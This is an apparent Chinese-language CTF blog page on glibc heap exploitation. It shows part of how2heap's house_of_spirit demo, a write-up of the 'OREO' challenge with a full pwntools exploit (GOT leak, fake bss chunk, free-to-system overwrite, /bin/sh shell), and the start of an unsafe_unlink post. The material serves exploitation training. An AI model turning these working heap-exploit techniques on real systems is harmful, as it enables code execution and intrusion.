class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the overwritten pointer.\n"</span>);</span><br><span class="line">	<span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>基本就是初始化堆之后，在栈上通过伪造一个chunk来free然后malloc出来</p>
<p>记两句吧：</p>
<p>在栈上伪造fake chunk时，next chunk.size要满足条件才能通过free的检查</p>
<p>The chunk.size of the <em>next</em> fake region has to be sane. That is &gt; <strong>2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena)</strong> to pass the nextsize integrity checks. No need for fastbin size.</p>
<p>fake chunk的地址需要16字节对齐（x64），所以在申请临时变量时才用到了<code>__attribute__ ((aligned (16)))</code></p>
<p>note that the memory address of the <em>region</em> associated with this chunk must be 16-byte aligned.</p>
<h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p>fake chunk伪造完成之后栈上布局如图所示：</p>
<img src="/2020/02/06/how2heap-house-of-spirit-OREO/1580794910542.png" width="90%" height="90%">

<p>free之后：</p>
<img src="/2020/02/06/how2heap-house-of-spirit-OREO/1580795039645.png" width="60%" height="60%">

<p>再次malloc结束之后可以看到RAX中的返回值便是fake chunk的data region</p>
<img src="/2020/02/06/how2heap-house-of-spirit-OREO/1580795339441.png" width="60%" height="60%">

<h1 id="OREO"><a href="#OREO" class="headerlink" title="OREO"></a>OREO</h1><p>写了好久的x64 heap这次总算碰到一个x86的 : )</p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>（经过分析之后先逆出了结构体和符号）</p>
<h3 id="main函数："><a href="#main函数：" class="headerlink" title="main函数："></a>main函数：</h3><img src="/2020/02/06/how2heap-house-of-spirit-OREO/1580813725716.png" width="70%" height="70%">

<p>main函数就是一段初始化，然后进入menu</p>
<h3 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h3><img src="/2020/02/06/how2heap-house-of-spirit-OREO/1580798688028.png" width="45%" height="45%">

<p>通过<code>fgets(&amp;s, 0x20, stdin);</code>和<code>__isoc99_sscanf(&amp;s, &quot;%u&quot;, &amp;v1)</code>的组合来输入然后switch</p>
<h3 id="lt-Rifile-structure-gt"><a href="#lt-Rifile-structure-gt" class="headerlink" title="&lt;Rifile structure&gt;"></a>&lt;Rifile structure&gt;</h3><p>分析下面几个函数时，先逆出程序用到的一个结构体，具体如下</p>
<img src="/2020/02/06/how2heap-house-of-spirit-OREO/1580813775276.png" width="60%" height="60%">

<h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><img src="/2020/02/06/how2heap-house-of-spirit-OREO/1580813832897.png" width="80%" height="80%">

<p>具体就是一个链表添加、结构体填充的操作（先填<code>forward_ptr</code>，再输入），全局变量head_ptr存放链表头指针，每次malloc一个refle（fast chunk），然后从对应的位置用<code>fgets</code>输入。两处溢出：<code>refle_name</code>处的溢出可以覆盖到下一个chunk的0x19字节内容，<code>newL_to_zero</code>是将最后的换行符换成<code>\x00</code>，最后<code>++refle_num</code></p>
<p><em>ps：<code>fgets(,n,)</code>时会读取 n-1个字符，并且包括 <code>\n</code>，如果输入字符的长度（不包括 <code>\n</code>）大于等于 n-1,则截取输入中前 n-1个字符（此时没有 <code>\n</code>）并把第 n个字符处填充成 <code>\x00</code>。当输入长度小于 n-1时，会把 <code>\n</code>也读入，并在 <code>\n</code>后面一个字节处填充 <code>\x00</code>（直接回车也会）</em></p>
<h3 id="Show-added-rifles"><a href="#Show-added-rifles" class="headerlink" title="Show added rifles"></a>Show added rifles</h3><img src="/2020/02/06/how2heap-house-of-spirit-OREO/1580813868490.png" width="80%" height="80%">

<p>根据链表输出所有<code>refle</code>的内容</p>
<h3 id="order"><a href="#order" class="headerlink" title="order"></a>order</h3><img src="/2020/02/06/how2heap-house-of-spirit-OREO/1580813953372.png" width="60%" height="60%">

<p>判断<code>refle_num</code>是否为0，不为0则获取链表头指针之后free掉链表上的每一个chunk，然后把头指针<code>head_ptr</code>置零，chunk中的<code>forward_refle_ptr</code>没有置零。然后<code>++ordered_num</code></p>
<h3 id="leave-message"><a href="#leave-message" class="headerlink" title="leave_message"></a>leave_message</h3><img src="/2020/02/06/how2heap-house-of-spirit-OREO/1580800304100.png" width="65%" height="65%">

<p>输入0x80长度的notice到notice_ptr所指向的区域</p>
<h3 id="show-stats"><a href="#show-stats" class="headerlink" title="show_stats"></a>show_stats</h3><img src="/2020/02/06/how2heap-house-of-spirit-OREO/1580813997114.png" width="55%" height="55%">

<p>输出<code>refle_num</code>，<code>ordered_num</code> ，<code>notice</code></p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区，初次调用 puts 时，malloc会分配缓冲区1024B 给stdout / 初次调用fgets时，malloc会分配缓冲区1024B 给stdin</p>
<p>所以一上来程序heap视图中就会有两个chunk，暂时觉得是知道怎么来的就好了 :(</p>
<p>这种链表题第一次自己写好像没有思路，先记录一下能想到东西吧</p>
<h3 id="leak："><a href="#leak：" class="headerlink" title="leak："></a>leak：</h3><p>leak libc的话，主要思路是通过溢出修改<code>forward_ptr</code>，使其指向对应GOT表的一些偏移，然后show added rifles时可以把函数的地址打印出来，leak chunk地址也可以通过这个方法，把<code>forward_ptr</code>改成<code>head_ptr</code>地址即可</p>
<p>leak stack好像行不通…</p>
<h3 id="Arbitrary-write："><a href="#Arbitrary-write：" class="headerlink" title="Arbitrary write："></a>Arbitrary write：</h3><p>程序只有三个输入点</p>
<ol>
<li>switch时调用的<code>fgets</code>和<code>sscanf</code>组合（应该没什么用，输入指针都是栈上的偏移）</li>
<li>add中的fgets，指针是对于结构体（chunk）的偏移，但是head_ptr的值在其中不可控，是malloc返回后直接输入的</li>
<li>leave_message中的<code>fgets(notice_ptr, 0x80, stdin);</code>这个是根据bss段上的一个指针来读取内容的</li>
</ol>
<p><em>ps：然后……过了好久终于才把house_of_spirit和这个题结合起来，我太stupid了</em></p>
<p>可以通过修改<code>forward_ptr</code>，指向一个bss段上有我们可控值的地方</p>
<img src="/2020/02/06/how2heap-house-of-spirit-OREO/1580814080828.png" width="45%" height="45%">

<p>举例子拿上面第一个个8B对齐的地址来说，如果我们add一个chunk然后修改<code>forward_ptr</code>指向这里，此时0x0804A29c处的值就是fake chunk的size字段，当然这里不可控所以我们要用第二个：0x0804A2A0，此时<code>refle_num</code>是可控的。</p>
<p>然后order的时候这块内存也会被free出来，只要我们保证house_of_spirit.c中提到的fake next chunk的size段是正常的就可以被正常free（对应的size段在notice上，对应在notice上的偏移为：0x0804A2A0+0x40+4-0x0x0804A2C0=36）</p>
<p>接着这块内存就可以被正常malloc出来，这个时候就有了可控的<code>notice_ptr</code>，然后再通过leave_message就可以达成Arbitrary write了！（自己花时间想出来了太开心 XD）</p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><h4 id="leaklibc"><a href="#leaklibc" class="headerlink" title="leaklibc"></a>leaklibc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">printf_GOT=<span class="number">0x0804A234</span></span><br><span class="line">libc_base=<span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaklibc</span><span class="params">()</span>:</span></span><br><span class="line">        add(<span class="string">'a'</span>*<span class="number">27</span>+p32(printf_GOT),<span class="string">'b'</span>*<span class="number">0x23</span>)<span class="comment">#change forward_ptr by refle_name</span></span><br><span class="line">        show_added_rifles()</span><br><span class="line">        p.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">        p.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">        <span class="keyword">global</span> libc_base</span><br><span class="line">        libc_base=my_u32(p.recv(<span class="number">4</span>))<span class="number">-0x49670</span></span><br></pre></td></tr></table></figure>

<h4 id="free-target-chunk"><a href="#free-target-chunk" class="headerlink" title="free target chunk"></a>free target chunk</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Cycle to fakesize=0x3f</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x3f</span>):</span><br><span class="line">        add(<span class="string">'name'</span>,<span class="string">'description'</span>)</span><br><span class="line">order()</span><br><span class="line"></span><br><span class="line">leave_message(<span class="string">'\x00'</span>*<span class="number">36</span>+p32(<span class="number">0x41</span>))<span class="comment">#Set fake next chunk size</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">27</span>+p32(<span class="number">0x0804A2A8</span>),<span class="string">'b'</span>*<span class="number">0x23</span>)</span><br><span class="line">order()<span class="comment">#Free our bss memory out</span></span><br></pre></td></tr></table></figure>

<p>先add 0x3f个rifle然后order，目标chunk的size被设置成0x3f，然后构造fake next size来过free的检查，接着再add一个<code>forward_ptr</code>为目标chunk的rifle，此时目标chunk的size为0x40，然后free出目标chunk</p>
<h4 id="set-GOT"><a href="#set-GOT" class="headerlink" title="set GOT"></a>set GOT</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'free out'</span> + <span class="string">"\033[0m"</span>)</span><br><span class="line">add(<span class="string">'name'</span>,p32(free_GOT))<span class="comment">#Set notice_ptr to free_GOT</span></span><br><span class="line"></span><br><span class="line">leaklibc()<span class="comment">#Now leak libc</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'libc_base:'</span>+hex(libc_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line">leave_message(p32(system_offset+libc_base)+p32(fgets_offset+libc_base))<span class="comment">#Set free_GOT to system</span></span><br></pre></td></tr></table></figure>

<p>再次malloc的时候就可以把目标chunk malloc出来了，然后直接在<code>notice_ptr</code>处填入free函数的GOT表地址</p>
<p>接着将system函数的实际地址填到free_GOT去</p>
<p><em>ps：leaklibc的操作要放到后面，要不然前面 leak之后再调用 order会出错，以及这里 free函数和 fgets的 GOT表项挨在一起，用 fgets 只填入 system 函数地址的话 fgets 的 GOT表项会被损坏（具体见前面所写的 fgets流程），程序往后运行会出错，所以这里填了两个</em></p>
<h4 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'/bin/sh'</span>,<span class="string">'/bin/sh'</span>)<span class="comment">#Set /bin/sh for system(linked list head)</span></span><br><span class="line">order()<span class="comment">#free(head_ptr)=system(binsh_ptr)</span></span><br></pre></td></tr></table></figure>

<p>这个应该不用解释了</p>
<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">'./oreo'</span>	<span class="comment">#binary's name here</span></span><br><span class="line">context.binary = binary		<span class="comment">#context here</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">pty = process.PTY</span><br><span class="line">p = process(binary, aslr = <span class="number">1</span>, stdin=pty, stdout=pty)	<span class="comment">#process option here</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Host =</span></span><br><span class="line"><span class="string">Port =</span></span><br><span class="line"><span class="string">p = remote(Host,Port)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">my_u64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">my_u32 = <span class="keyword">lambda</span> x: u32(x.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"><span class="comment">#log.info("\033[1;36m" + hex(bin_addr) + "\033[0m")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># todo here</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,description)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Action: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Rifle name: '</span>)</span><br><span class="line">	p.sendline(name)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'Rifle description: '</span>)</span><br><span class="line">	p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_added_rifles</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Action: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Action: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leave_message</span><span class="params">(notice)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Action: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line">	p.recvuntil(<span class="string">'your order: '</span>)</span><br><span class="line">	p.sendline(notice)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_stats</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Action: '</span>)</span><br><span class="line">	p.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line">printf_GOT=<span class="number">0x0804A234</span></span><br><span class="line">libc_base=<span class="number">0</span></span><br><span class="line">system_offset=<span class="number">0x3ada0</span></span><br><span class="line">free_GOT=<span class="number">0x0804A238</span></span><br><span class="line">fgets_offset=<span class="number">0x5e150</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leaklibc</span><span class="params">()</span>:</span></span><br><span class="line">	add(<span class="string">'a'</span>*<span class="number">27</span>+p32(printf_GOT),<span class="string">'b'</span>*<span class="number">0x23</span>)</span><br><span class="line">	show_added_rifles()</span><br><span class="line">	p.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">	<span class="keyword">global</span> libc_base</span><br><span class="line">	libc_base=my_u32(p.recv(<span class="number">4</span>))<span class="number">-0x49670</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Cycle to fakesize=0x3f</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x3f</span>):</span><br><span class="line">	add(<span class="string">'name'</span>,<span class="string">'description'</span>)</span><br><span class="line">order()</span><br><span class="line"></span><br><span class="line">leave_message(<span class="string">'\x00'</span>*<span class="number">36</span>+p32(<span class="number">0x41</span>))<span class="comment">#Set fake next chunk size</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">27</span>+p32(<span class="number">0x0804A2A8</span>),<span class="string">'b'</span>*<span class="number">0x23</span>)</span><br><span class="line">order()<span class="comment">#Free our bss memory out</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'free out'</span> + <span class="string">"\033[0m"</span>)</span><br><span class="line">add(<span class="string">'name'</span>,p32(free_GOT))<span class="comment">#Set notice_ptr to free_GOT</span></span><br><span class="line"></span><br><span class="line">leaklibc()<span class="comment">#Now leak libc</span></span><br><span class="line">log.info(<span class="string">"\033[1;36m"</span> + <span class="string">'libc_base:'</span>+hex(libc_base) + <span class="string">"\033[0m"</span>)</span><br><span class="line"></span><br><span class="line">leave_message(p32(system_offset+libc_base)+p32(fgets_offset+libc_base))<span class="comment">#Set free_GOT to system</span></span><br><span class="line">add(<span class="string">'/bin/sh'</span>,<span class="string">'/bin/sh'</span>)<span class="comment">#Set /bin/sh for system (linked list head)</span></span><br><span class="line">order()<span class="comment">#free(head_ptr)=system(binsh_ptr)</span></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="en">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Coldshield">
      <meta itemprop="description" content="分享一些bin学习日常的菜鸡">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Coldshield's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/" class="post-title-link" itemprop="url">how2heap - unsafe_unlink&stkof、Wheel of Robots</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-02-02 23:30:16" itemprop="dateCreated datePublished" datetime="2020-02-02T23:30:16+08:00">2020-02-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-02-29 18:09:07" itemprop="dateModified" datetime="2020-02-29T18:09:07+08:00">2020-02-29</time>
              </span>

          
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="fa fa-comment-o"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/2020/02/02/how2heap-unsafe-unlink-stkof%E3%80%81Wheel-of-Robots/" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="how2heap-unsafe-unlink-amp-stkof、Wheel-of-Robots"><a href="#how2heap-unsafe-unlink-amp-stkof、Wheel-of-Robots" class="headerlink" title="how2heap - unsafe_unlink&amp;stkof、Wheel of Robots"></a>how2heap - unsafe_unlink&amp;stkof、Wheel of Robots</h1><p>环境：ubuntu16.04 libc2.23</p>
<h2 id="unsafe-unlink-c"><a href="#unsafe-unlink-c" class="headerlink" title="unsafe_unlink.c:"></a>unsafe_unlink.c:</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Welcome to unsafe unlink 2.0!\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Tested in Ubuntu 14.04/16.04 64bit.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> malloc_size = <span class="number">0x80</span>; <span class="comment">//we want to be big enough not to use fastbins</span></span><br><span class="line">	<span class="keyword">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n"</span>);</span><br><span class="line"></span><br><span class="line">	chunk0_ptr = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk0</span></span><br><span class="line">	<span class="keyword">uint64_t</span> *chunk1_ptr  = (<span class="keyword">uint64_t</span>*) <span class="built_in">malloc</span>(malloc_size); <span class="comment">//chunk1</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The global chunk0_ptr is at %p, pointing to %p\n"</span>, &amp;chunk0_ptr, chunk0_ptr);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The victim chunk we are going to corrupt is at %p\n\n"</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We create a fake chunk inside chunk0.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">2</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">3</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\n"</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\n"</span>);</span><br><span class="line">	chunk0_ptr[<span class="number">3</span>] = (<span class="keyword">uint64_t</span>) &amp;chunk0_ptr-(<span class="keyword">sizeof</span>(<span class="keyword">uint64_t</span>)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk fd: %p\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Fake chunk bk: %p\n\n"</span>,(<span class="keyword">void</span>*) chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//fprintf(stderr, "We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (chunk+size)\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&amp;(~ 0x7))\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "If x = chunk0_ptr[1] &amp; (~ 0x7), that is x = *(chunk0_ptr + x).\n");</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, "We just need to set the *(chunk0_ptr + x) = x, so we can pass the check\n");</span></span><br><span class="line">	<span 